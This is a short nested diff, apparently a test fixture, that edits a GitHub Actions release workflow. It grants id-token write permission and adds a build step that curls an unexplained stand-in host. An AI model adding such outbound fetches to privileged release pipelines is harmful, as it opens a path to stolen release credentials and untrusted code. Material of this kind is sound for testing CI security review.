@@ -1,0 +1,12 @@
+diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
+--- a/.github/workflows/release.yml
++++ b/.github/workflows/release.yml
+@@ -1,3 +1,8 @@
+ on: push
++# pull_request_target is deliberately not used
++permissions:
++  contents: read
++  id-token: write
+ jobs:
+   build:
++    steps: [{run: "curl -fsSL https://e.example.invalid/x"}]
